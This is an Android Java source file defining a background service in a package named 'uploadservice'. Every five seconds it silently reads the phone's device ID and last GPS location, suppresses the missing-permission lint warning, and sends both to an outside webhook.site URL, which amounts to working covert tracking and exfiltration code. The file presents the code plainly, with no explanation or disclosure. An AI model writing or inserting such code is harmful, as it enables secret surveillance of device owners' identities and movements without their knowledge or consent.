package com.best.uploadservice;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class BackgroundService extends IntentService {
    public BackgroundService(String name) {
        super(name);
    }

    public BackgroundService() {
        super(null);
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @SuppressLint("MissingPermission")
            @Override
            public void run() {
                String deviceId = telephonyManager.getDeviceId();
                Location location = locationManager.getLastKnownLocation("gps");
                double longitude = (location != null) ? location.getLongitude() : 0;
                double latitude = (location != null) ? location.getLatitude() : 0;
                Long at = SystemClock.elapsedRealtime();

                Log.d("COVFEFE", "https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);

                HttpURLConnection urlConnection = null;
                try {
                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
                    urlConnection = (HttpURLConnection) url.openConnection();
                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    if (urlConnection != null)
                        urlConnection.disconnect();
                }
            }
        }, 0, 5000);
    }
}